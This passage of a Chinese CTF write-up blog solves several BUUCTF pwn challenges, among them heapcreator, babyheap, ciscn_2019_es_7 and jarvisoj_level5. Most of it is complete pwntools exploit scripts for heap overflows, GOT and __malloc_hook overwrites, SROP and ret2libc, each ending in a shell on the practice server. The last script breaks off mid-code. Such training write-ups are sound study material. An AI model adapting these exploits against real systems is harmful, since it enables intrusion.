|申请堆的size|指向堆的指针|</p><p>根据这个指针，可以大作文章，加之还有off-by-one的漏洞</p><p><strong>具体步骤：</strong></p><p>1.利用off-by-one扩大chunksize，起码要包含0x20大小的chunk，感觉我也没怎么搞懂，反正就是</p><p>要精心构造，比如这题，free后来申请回来时，0x40能改0x20里面的指针与size</p><p>2.指针指向的是堆的地址，我们把它改成free_got的地址，再，show，就泄露了libc地址</p><p>3.由于指向的是free的got的地址，我们继续可以edit填入base+system，就劫持了freegot为system</p><p>4.再利用前面某个chunk填充的/bin/sh\x00执行free，就执行system（/bin/sh\x00）</p><p>**注意点：**除了合理填充范围内，以外的最好不要乱改，就好比0x20大小的里size参数，要改正确</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./heapcreator&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">26706</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size,content</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;Content of heap :&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit</span>():<br> sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br><span class="hljs-comment">#-----------------------------------------</span><br>free_got=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>create(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>create(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+p64(<span class="hljs-number">0</span>)+p8(<span class="hljs-number">0x41</span>))<br>delete(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">0x30</span>)+p64(free_got))<br>show(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Content : &#x27;</span>)<br>got=uu64(rc(<span class="hljs-number">6</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br><span class="hljs-comment">#debug()</span><br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#---------------------------------------</span><br>edit(<span class="hljs-number">1</span>,p64(system))<br>delete(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="0ctf-2017-babyheap">0ctf_2017_babyheap</h3><p>这题是我做的第一个堆题，buu题目重复了</p><p>**关键词：**堆溢出</p><p><strong>思路：</strong></p><p>1.运用堆溢出，伪造一个包含index1和2，大小的在unsortbin大小范围的块，free到unsortbin，然后申请其原来index1大小的块，main_arena附近的地址就会下移到index2的块，地址就能被dump出来。泄露了main_arena附近的地址</p><p>2.算出base=泄露addr-偏移-（ida里查看malloc_trim函数v22变量的值）</p><p>算出og，system</p><p>3.运用堆溢出，修改free后的fd，再allocate两次，就能分配道指定地址，因为要通过检查，所以地址为（malloc_hook-0x23）（偏移固定）</p><p>4.在malloc_hook的地址上填入og</p><p>5.执行allocate，就会带动shell</p><p>**注意点：**我自己重做的时候接收malloc地址出错了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./0ctf_2017_babyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">28122</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allocate</span>(<span class="hljs-params">size</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index,size,content</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br> sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br> sla(<span class="hljs-string">&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br> sla(<span class="hljs-string">&#x27;Command: &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br> sla(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#-------------------------------------------------------------</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#0</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#1</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#2</span><br>allocate(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#3</span><br>fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>))<br>free(<span class="hljs-number">1</span>)<br>allocate(<span class="hljs-number">0x60</span>)<br>dump(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(addr)<br>base=addr-<span class="hljs-number">88</span>-<span class="hljs-number">0x3C4B20</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>system=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>malloc_hook=base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>og=base+o_g_old[<span class="hljs-number">1</span>]<br><span class="hljs-comment">#-----------------------------------------------------------</span><br>free(<span class="hljs-number">1</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#1</span><br>allocate(<span class="hljs-number">0x60</span>)<span class="hljs-comment">#4</span><br>fill(<span class="hljs-number">4</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(og))<br>allocate(<span class="hljs-number">0x1</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-es-7">ciscn_2019_es_7</h3><p>**关键词：**SROP</p><p>遇到有syscall，且不好找gadget的情况，考虑SROP</p><p><strong>思路：</strong></p><p>这题暗示明显，gadget里面有0xf，和0x3b赋值给rax，分别对应sigreturn，和execve</p><p><strong>具体步骤：</strong></p><p>1.靠write泄露栈的地址，gdb调试得到padding与栈的地址的偏移</p><p>可以find ‘/bin/sh’就能找到位置之间的偏移</p><p>2.rop调用sigreturn，后再填个sigframe</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">25062</span>)<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#r=process(&#x27;./ciscn_2019_es_7&#x27;)</span><br>syscall_ret=<span class="hljs-number">0x400517</span><br>read=<span class="hljs-number">0x4004F1</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>mov_rax_sigreturn=<span class="hljs-number">0x4004DA</span><br>mov_rax_execve=<span class="hljs-number">0x4004E2</span><br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(read))<br>r.recv(<span class="hljs-number">0x20</span>)<br>stack_addr=u64(r.recv(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(stack_addr)<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.recv(<span class="hljs-number">8</span>)<br>sigframe=SigreturnFrame()<br>sigframe.rax=constants.SYS_execve<br>sigframe.rdi=stack_addr-<span class="hljs-number">0x118</span><br>sigframe.rsi=<span class="hljs-number">0x0</span><br>sigframe.rdx=<span class="hljs-number">0x0</span><br>sigframe.rsp=stack_addr<br>sigframe.rip=syscall_ret<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">8</span>+p64(mov_rax_sigreturn)+p64(syscall_ret)+<span class="hljs-built_in">str</span>(sigframe))<br>r.interactive()<br></code></pre></td></tr></table></figure><p>记一下，要重做一下<strong>ciscn_2019_s_3</strong></p><h3 id="jarvisoj-level5">jarvisoj_level5</h3><p>**关键词：**ROP</p><p><strong>思路：</strong></p><p>1.ret2libc即可</p><p><strong>注意点：</strong></p><p>write的第三个参数pop_rdx找不到，所以断点设在第一次send前，查看rdx寄存器的值，我发现是400，就不用管了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>r=remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27831</span>)<br><span class="hljs-comment">#r=process(&#x27;./level3_x64&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf=ELF(<span class="hljs-string">&#x27;./level3_x64&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>pop_rdi=<span class="hljs-number">0x4006b3</span><br>pop_rsi_r15=<span class="hljs-number">0x4006b1</span><br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_r15)+p64(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(<span class="hljs-number">0</span>)+p64(elf.sym[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]))<br>got=u64(r.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(got)<br>base=got-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(base)<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>og=base+o_g_old[<span class="hljs-number">2</span>]<br>r.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>r.send(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(og))<br><span class="hljs-comment">#gdb.attach(r)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="hitcontraining-bamboobox">hitcontraining_bamboobox</h3><p>**关键词：**堆溢出</p><p>**思路：**这种题限制少，利用的姿势很多，我已经见到3种了，unlink，House of Force，和我这种我也不知道叫啥</p><p>这里我利用思路和上面0ctf几乎一致</p><p>就不细讲了</p><p>**注意点：**我本来realloc那里和og位置填错了，卡了一会，</p><p>应该填的是 ， malloc_hook前一个的realloc填og，而原本的malloc_hook中写realloc中push的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./bamboobox&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="hljs-number">27318</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-----------------------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">length,name</span>):<br> sla(<span class="hljs-string">&#x27;Your choice:&#x27;</span>,<span 